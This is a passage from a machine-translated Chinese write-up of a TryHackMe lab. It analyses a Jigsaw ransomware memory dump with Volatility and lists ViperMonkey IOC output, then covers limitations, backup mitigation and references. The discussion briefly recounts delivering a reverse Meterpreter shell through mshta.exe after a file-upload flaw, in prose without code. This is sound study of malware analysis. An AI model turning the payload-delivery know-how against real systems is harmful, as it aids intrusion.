iv">remnux@thm-remnux:~/Tasks/6$ volatility -f Win7-Jigsaw.raw --profile=Win7SP1x64 pslist</strong><br/>Volatility Foundation Volatility Framework 2.6.1<br/>/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.<br/>  from cryptography.hazmat.backends.openssl import backend<br/><br/>[... snip ...]</span></pre><p id="ce60" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">下表描述了执行命令的结果:</p><figure class="la lb lc ld gu le gi gj paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gi gj oj"><img src="../Images/0b948128fadedac644a1ecb6c023ca34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hKsfhMVUu3l2LhQeuYXibw.png"/></div></div><figcaption class="ll lm gk gi gj ln lo bd b be z dk translated">表3 —请注意，该表可能存在一些渲染错误。</figcaption></figure><p id="9834" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">从这个进程列表来看，Jigsaw勒索软件可能正在使用某种进程注入技术(参见<a class="ae lp" href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" rel="noopener ugc nofollow" target="_blank"> Hosseini 2017 </a>)，并正在使用<a class="ae lp" href="https://www.dropbox.com/dropbox" rel="noopener ugc nofollow" target="_blank"> Dropbox (n.d.) </a>进行数据渗透，或用于命令和控制目的。<code class="fe nh ni nj nk b">drpbx.exe</code>模块的进程ID是3704，所以我指示<code class="fe nh ni nj nk b">volatility</code>枚举可执行文件使用的动态链接库:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="3b10" class="ob lr iu nk b be oc od l oe of"><strong class="nk iv">remnux@thm-remnux:~/Tasks/6$ volatility -f Win7-Jigsaw.raw --profile=Win7SP1x64 dlllist -p 3704</strong><br/>Volatility Foundation Volatility Framework 2.6.1<br/>/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.<br/>  from cryptography.hazmat.backends.openssl import backend<br/>************************************************************************<br/>drpbx.exe pid:   3704<br/>Command line : "C:\Users\CMNatic\AppData\Local\Drpbx\drpbx.exe" C:\Users\CMNatic\Desktop\jigsaw.exe<br/>Service Pack 1<br/><br/>[... snip ...]</span></pre><p id="eeca" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">下表描述了运行此命令的结果:</p><figure class="la lb lc ld gu le gi gj paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gi gj ok"><img src="../Images/3c755862810b6c5f9c8f971bc63d161b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*35CoqSkuT7-r1gu_Mpa1aA.png"/></div></div><figcaption class="ll lm gk gi gj ln lo bd b be z dk translated">表4</figcaption></figure><p id="4959" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">一个有趣的加载DLL是<code class="fe nh ni nj nk b">CRYPTBASE.dll</code>，是Windows开发者用于加密函数的库(<a class="ae lp" href="https://www.processlibrary.com/en/directory/files/cryptbase/4691/" rel="noopener ugc nofollow" target="_blank">进程列表n.d. </a>)。虽然该DLL通常是安全的，但它可以在勒索软件活动中用于加密文件。这可以作为进一步分析的基础。</p><h1 id="9435" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">讨论</h1><p id="76bc" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我的分析是相当初步的，只是“触及”了一项全面调查所需做的众所周知的表面工作。其他信息安全的研究人员和学生已经基于这个房间做了他们对Jigsaw勒索病毒的分析(<a class="ae lp" href="https://overide.medium.com/mal-remnux-the-redux-tryhackme-writeup-2402bba5cc79" rel="noopener">Bagde 2021</a>；<a class="ae lp" href="https://shamsher-khan-404.medium.com/mal-remnux-the-redux-tryhackme-8d257a6a5665" rel="noopener"> Khan 2021 </a>)我也推荐阅读这些文章，了解进行这类勒索软件分析的其他观点和方法。</p><p id="4fa2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">值得注意的一件事是，在做渗透测试时，我确实有过通过命令行中的<code class="fe nh ni nj nk b">mshta.exe</code>用微软的HTML应用程序执行有效载荷的经验。例如，我修改了一个用微软C#编写的反向shell stager(参见<a class="ae lp" href="https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/" rel="noopener ugc nofollow" target="_blank"> Wagner等人2022 </a>)，在易受其攻击的网站上触发文件上传漏洞后执行反向meter preter shell(<a class="ae lp" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" rel="noopener ugc nofollow" target="_blank">Metasploit Unleashed n . d .</a>)(参见<a class="ae lp" rel="noopener ugc nofollow" target="_blank" href="/tryhackme-writeup-hackpark-bd9c075c5262">“Aleksey”2022</a>)。我认为，这可以作为更多的证据，如果做得好，微软的HTML应用程序可以在向预定目标交付有效载荷方面发挥作用。</p><h2 id="d9a0" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">限制</h2><p id="ff12" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">应该注意的是，我只是浏览了一下这个房间，只是粗略地分析了一下内存转储及其相关的丢弃器。需要进行更多的分析来了解Jigsaw勒索软件的功能。</p><p id="c67b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">关于PDF文档分析的局限性，我无法找出他们具体做了什么。我才发现他们执行的是JavaScript代码，彼此之间有某种关联。这与该房间发现与攻击者的机器相关联的IP地址和端口号形成对比(图1):</p><figure class="la lb lc ld gu le gi gj paragraph-image"><div class="gi gj ol"><img src="../Images/fb88b7b7d263f5a229d0a03574bd25ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1086/format:webp/0*4oBIs_PsZd1jUOML.png"/></div><figcaption class="ll lm gk gi gj ln lo bd b be z dk translated">图1，图像鸣谢:<a class="ae lp" href="https://tryhackme.com/room/malremnuxv2" rel="noopener ugc nofollow" target="_blank">《cmnatic》(2020)</a>。</figcaption></figure><p id="476b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">关于<em class="ky">蝮蛇猴</em>的结果，它输出了一些URIs作为<strong class="jt iv">潜在</strong>妥协的指标。这里的关键词是“潜在的”，因为分析师需要判断哪些URIs与攻击者有关，哪些是良性的。</p><p id="72a2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">例如，以下内容很可能与攻击者有关:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="4953" class="ob lr iu nk b be oc od l oh of">INFO     Found possible intermediate IOC (URL): 'http://tryhackme.com/notac2cserver.sh'</span></pre><p id="4775" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">以下是最有可能<strong class="jt iv">与</strong>无关的攻击者:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="277b" class="ob lr iu nk b be oc od l oh of">INFO     Found possible intermediate IOC (URL): 'http://www.w3.org/1999/02/22-rdf-syntax-ns'</span></pre><p id="40ec" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这个故事的主旨是不要过于依赖安全工具的输出，而是根据需要使用直觉、常识和良好的判断。</p><h2 id="eb0f" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">减轻</h2><p id="f966" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">正如我之前所讨论的，应该做更多的分析来弄清楚这种恶意软件是如何工作的，以便发明更好的缓解技术。尽管如此，还是有办法面对不确定性。例如，<a class="ae lp" href="https://link.springer.com/chapter/10.1007/978-3-319-68711-7_21" rel="noopener ugc nofollow" target="_blank"> Laszka等人(2017 </a>)讨论了勒索软件的经济学，并提到备份可以作为一种减轻其不良影响的机制。</p><h1 id="9ee4" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">结论</h1><p id="8d47" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我已经证明了诸如<code class="fe nh ni nj nk b">peepdf</code>、<em class="ky"> Viper Monkey </em>和<em class="ky"> Volatility Framework </em>这样的工具在分析勒索软件的<em class="ky"> Jigsaw </em>菌株时是有用的。我已经讨论了我的分析的局限性，以及需要如何做进一步的工作来“弄清楚”<em class="ky"> Jigsaw </em>是如何工作的，以及如何最好地减轻它。</p><h2 id="a9d9" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">插头</h2><p id="9616" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">对于喜欢我的作品但尚未注册Medium会员计划的读者，如果他们能通过我的推荐链接注册，我将不胜感激(这在经济上帮助了我https://medium.com/membership/@EpsilonCalculus ❤️):<a class="ae lp" href="https://medium.com/membership/@EpsilonCalculus" rel="noopener"/></p><p id="f4fc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">此外，对于任何喜欢我关于恶意软件分析和CTF的文章的读者，我欢迎他们查看我的技术系列，在那里我讨论了这些主题和更多内容:</p><div class="om on gq gs oo"><div role="button" tabindex="0" class="ab bv gw cb fq op oq bn or lj ex"><div class="os l"><div class="ab q"><div class="l di"><img alt="Aleksey" class="l de bw ot ou fe" src="../Images/886245347566d4089464c40d5ec5ccfc.png" width="20" height="20" loading="lazy" data-original-src="https://miro.medium.com/v2/resize:fill:40:40/1*QCw3Unyn7vnntVR7WHXImA.png"/><div class="fb bw l ot ou fc n aw fd"/></div><div class="hi l fp"><p class="bd b dl z fq fr fs ft fu fv fw fx dk translated"><a class="ae af ag ah ai aj ak al am an ao ap aq ar as" href="https://medium.com/@EpsilonCalculus?source=post_page-----ee949b444f3f--------------------------------" rel="noopener follow" target="_top">阿列克谢</a></p></div></div><div class="ox oy gx l"><h2 class="bd iv uk mo fq ul fs ft um fv fx it bi translated">技术报道</h2></div><div class="ab q"><div class="l fp"><a class="bd b be z bi un au uo up uq rd ur an eh ei us ut uu el em eo de bk ep" href="https://medium.com/@EpsilonCalculus/list/technical-writeups-63f8cfbee59c?source=post_page-----ee949b444f3f--------------------------------" rel="noopener follow" target="_top">View list</a></div><div class="uv l fp"><span class="bd b dl z dk">43 stories</span></div></div></div><div class="pk dh pl fq ab pm fp di"><div class="di pc bv pd pe"><div class="dh l"><img alt="" class="dh" src="../Images/e91d6d5a97594a0fdfb555761a774256.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*Cq7_tlU0Ukq_pR63YMHgCg.png"/></div></div><div class="di pc bv pf pg ph"><div class="dh l"><img alt="" class="dh" src="../Images/637c9938ab55d24718c20c200ddda1a0.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*pkGgeXcrKXaHU2eki1bOHQ.png"/></div></div><div class="di bv pi pj ph"><div class="dh l"><img alt="" class="dh" src="../Images/78df73524bea8b23f1be91acbb669dc6.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*_1zitov03vXXuoYr2lje2A.png"/></div></div></div></div></div><h1 id="3fd8" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">参考</h1><p id="1ba1" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">艾布拉姆斯，L. (2016)。<em class="ky">拼图勒索软件解密:将删除你的文件，直到你支付赎金</em>。哔哔作响的电脑。2022年11月28日检索自:<a class="ae lp" href="https://www.bleepingcomputer.com/news/security/jigsaw-ransomware-decrypted-will-delete-your-files-until-you-pay-the-ransom/" rel="noopener ugc nofollow" target="_blank">https://www . bleeping computer . com/news/security/jigsaw-ransomware-decrypted-will-delete-you-files-until-you-pay-the-ransom/</a></p><p id="5f32" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Adobe(公元2022年)。<em class="ky">将动作和脚本应用到pdf</em>。2022年11月28日检索自:<a class="ae lp" href="https://helpx.adobe.com/acrobat/using/applying-actions-scripts-pdfs.html" rel="noopener ugc nofollow" target="_blank">https://helpx . adobe . com/acrobat/using/applying-actions-scripts-pdf . html</a></p><p id="e9b0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《阿列克谢》(2022)。<em class="ky"> TryHackMe报道:HackPark </em>。信息安全报道。2022年11月29日检索自:<a class="ae lp" rel="noopener ugc nofollow" target="_blank" href="/tryhackme-writeup-hackpark-bd9c075c5262">https://infosecwriteups . com/tryhackme-writeup-hack park-bd9c 075 c 5262</a></p><p id="0f09" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《艾娃麦克斯》(2018)。<em class="ky">甜美却神经病【官方音乐视频】</em>。YouTube视频。2022年11月29日检索自:<a class="ae lp" href="https://youtu.be/WXBHCQYxwr0" rel="noopener ugc nofollow" target="_blank">https://youtu.be/WXBHCQYxwr0</a></p><p id="94d4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">茨韦塔纳·伯纳斯·李(2005)。统一资源标识符(URI):通用语法。互联网工程任务组。2022年11月28日检索自:<a class="ae lp" href="https://www.rfc-editor.org/rfc/rfc3986" rel="noopener ugc nofollow" target="_blank">https://www.rfc-editor.org/rfc/rfc3986</a></p><p id="5da3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">巴格德(2021)。MAL: REMnux-The Redux TryHackMe书面报道。2022年11月29日检索自:<a class="ae lp" href="https://overide.medium.com/mal-remnux-the-redux-tryhackme-writeup-2402bba5cc79" rel="noopener">https://overide . medium . com/mal-remnux-the-redux-tryhackme-writeup-2402 BBA 5 cc 79</a></p><p id="b8e9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">伯恩博士和索普博士(2017年)。<em class="ky">拼图:勒索软件攻击的调查与对策</em>。欧洲网络战与安全会议。ProQuest。<a class="ae lp" href="https://www.proquest.com/openview/afcfc630d5877520a0734e706402d403/" rel="noopener ugc nofollow" target="_blank">https://www . proquest . com/openview/AFC fc 630d 5877520 a 0734 e 706402d 403/</a></p><p id="2a85" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">陈(2022)。<em class="ky">x86–64处理器(又名amd64、x64):旋风之旅</em>。旧的新事物。2022年11月29日检索:<a class="ae lp" href="https://devblogs.microsoft.com/oldnewthing/20220831-00/?p=107077" rel="noopener ugc nofollow" target="_blank">https://devblogs.microsoft.com/oldnewthing/20220831-00/?p=107077 </a></p><p id="9367" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《cmnatic》(2020)。<em class="ky">MAL:REMnux—Redux</em>。TryHackMe。2022年11月28日检索自:<a class="ae lp" href="https://tryhackme.com/room/malremnuxv2" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/malremnuxv2</a></p><p id="2861" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">康蒂，m .，冈瓦尔，a .，和鲁杰，S. (2018)。从比特币交易的角度看勒索病毒活动的经济意义。<em class="ky">在计算机&amp;安全(第79卷，第162–189页)</em>。爱思唯尔BV。<a class="ae lp" href="https://doi.org/10.1016/j.cose.2018.08.008" rel="noopener ugc nofollow" target="_blank">https://doi.org/10.1016/j.cose.2018.08.008</a></p><p id="aa03" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">库珀，P. R .，科恩菲尔德，L. M .和查维斯，R. A. (2003年)。<em class="ky">用HTML编写视窗应用程序的方法和装置</em>(美国6662341-B1)。美国专利商标局。<a class="ae lp" href="https://patents.google.com/patent/US6662341B1/en" rel="noopener ugc nofollow" target="_blank">https://patents.google.com/patent/US6662341B1/en</a></p><p id="1230" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Dropbox(未标明)。2022年11月29日检索自:<a class="ae lp" href="https://www.dropbox.com/dropbox" rel="noopener ugc nofollow" target="_blank">https://www.dropbox.com/dropbox</a></p><p id="d962" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">埃斯帕尔扎，法学硕士(未注明)。<em class="ky"> peepdf: </em> <em class="ky">分析pdf文档的强大Python工具</em>。GitHub仓库。2022年11月28日检索自:<a class="ae lp" href="https://github.com/jesparza/peepdf" rel="noopener ugc nofollow" target="_blank">https://github.com/jesparza/peepdf</a></p><p id="0086" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">埃尔南德斯·卡斯特罗、卡特赖特和斯捷潘诺娃(2017年)。<em class="ky">勒索软件的经济分析</em>。arXiv。<a class="ae lp" href="https://doi.org/10.48550/arXiv.1703.06660" rel="noopener ugc nofollow" target="_blank">https://doi.org/10.48550/arXiv.1703.06660</a></p><p id="4ca6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Hosseini，A. (2017)。<em class="ky">十大流程注入技术:常见和趋势流程注入技术的技术综述</em>。弹性博客。2022年11月29日检索自:<a class="ae lp" href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" rel="noopener ugc nofollow" target="_blank">https://www . elastic . co/blog/ten-process-injection-technique-survey-common-and-trending-process</a></p><p id="159c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Khan，S. (2021年)。<em class="ky">MAL:REMnux The Redux TryHackme</em>。2022年11月29日检索自:<a class="ae lp" href="https://shamsher-khan-404.medium.com/mal-remnux-the-redux-tryhackme-8d257a6a5665" rel="noopener">https://shams her-Khan-404 . medium . com/mal-remnux-the-redux-tryhackme-8d 257 a6a 5665</a></p><p id="204d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">拉加德克山口(未标明)。ViperMonkey:一个VBA解析器和仿真引擎，用于分析恶意宏。GitHub仓库。2022年11月29日检索自:<a class="ae lp" href="https://github.com/decalage2/ViperMonkey" rel="noopener ugc nofollow" target="_blank">https://github.com/decalage2/ViperMonkey</a></p><p id="c854" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">拉斯卡，a .，法亨，s .，格罗斯拉格，J. (2017)。勒索软件的经济学。<em class="ky">载于:Rass，s .，An，b .，Kiekintveld，c .，Fang，f .，Schauer，s .(编辑)安全决策和博弈论。GameSec 2017。计算机科学讲义(第397–417页)，第10575卷</em>。斯普林格，查姆。<a class="ae lp" href="https://doi.org/10.1007/978-3-319-68711-7_21" rel="noopener ugc nofollow" target="_blank">https://doi.org/10.1007/978-3-319-68711-7_21</a></p><p id="95d6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Linux手册页(未注明)。<code class="fe nh ni nj nk b">strings</code> <em class="ky"> —打印文件中的可打印字符串</em>。2022年11月28日检索自:<a class="ae lp" href="https://linux.die.net/man/1/strings" rel="noopener ugc nofollow" target="_blank">https://linux.die.net/man/1/strings</a></p><p id="761c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Metasploit Unleashed(未标明)。<em class="ky">关于Metasploit Meterpreter </em>。进攻安全。2022年11月29日检索自:<a class="ae lp" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" rel="noopener ugc nofollow" target="_blank">https://www . offensive-security . com/metasploit-unleashed/about-meter preter/</a></p><p id="95f1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">微软公司。<em class="ky">微软Office </em>。2022年11月29日检索自:<a class="ae lp" href="https://www.microsoft.com/en-us/microsoft-365/microsoft-office" rel="noopener ugc nofollow" target="_blank">https://www . Microsoft . com/en-us/Microsoft-365/Microsoft-office</a></p><p id="558f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">微软公司。<em class="ky">安装Windows 7服务包1 (SP1) </em>。2022年11月29日检索自:<a class="ae lp" href="https://support.microsoft.com/en-us/windows/install-windows-7-service-pack-1-sp1-b3da2c0f-cdb6-0572-8596-bab972897f61" rel="noopener ugc nofollow" target="_blank">https://support . Microsoft . com/en-us/windows/install-windows-7-service-pack-1-SP1-B3 da 2c 0f-CDB 6-0572-8596-Bab 972897 f61</a></p><p id="ae14" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">p .奥凯恩、s .塞泽尔和d .卡林(2018年)。勒索软件的进化<em class="ky">。IET网络，7(5)，321–327。https://doi.org/10.1049/iet-net.2017.0207</em>T3</p><p id="ef6e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">工艺库(未注明)。<em class="ky">什么是</em> <code class="fe nh ni nj nk b">cryptbase.dll</code>？2022年11月29日检索自:<a class="ae lp" href="https://www.processlibrary.com/en/directory/files/cryptbase/4691/" rel="noopener ugc nofollow" target="_blank">https://www . process library . com/en/directory/files/crypt base/4691/</a></p><p id="750d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Simoiu，c .，Gates，c .，Bonneau，j .和Goel，S. (2019)。“有人告诉我，要么买一个软件，要么丢掉我的电脑。我忽略了”:勒索病毒研究。<em class="ky">在第十五届可用隐私与安全研讨会上【SOUPS 2019】155–174</em>。USENIX协会。2022年11月28日检索:<a class="ae lp" href="https://www.usenix.org/conference/soups2019/presentation/simoiu" rel="noopener ugc nofollow" target="_blank">https://www . usenix . org/conference/soups 2019/presentation/SIMO iu</a></p><p id="a505" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">波动基金会(未标明)。<em class="ky">关于波动率基础</em>。2022年11月29日检索自:<a class="ae lp" href="https://www.volatilityfoundation.org/about" rel="noopener ugc nofollow" target="_blank">https://www.volatilityfoundation.org/about</a></p><p id="3f55" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">瓦格纳等人(2022)。<em class="ky"> C#编程指南</em>。微软学习。2022年11月29日检索自:<a class="ae lp" href="https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/" rel="noopener ugc nofollow" target="_blank">https://learn . Microsoft . com/en-us/dot net/cs harp/programming-guide/</a></p><p id="8d28" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Zimba，a .，Chishimba，M. (2019)。加密勒索软件攻击的经济影响:企业系统的最新发展。<em class="ky">欧洲安全研究中心</em> <strong class="jt iv"> 4 </strong>，3–31。<a class="ae lp" href="https://doi.org/10.1007/s41125-019-00039-8" rel="noopener ugc nofollow" target="_blank">https://doi.org/10.1007/s41125-019-00039-8</a></p></div><div class="ab cl pr ps hy pt" role="separator"><span class="pu bw bk pv pw px"/><span class="pu bw bk pv pw px"/><span class="pu bw bk pv pw"/></div><div class="in io ip iq ir"><h2 id="dded" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lp" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>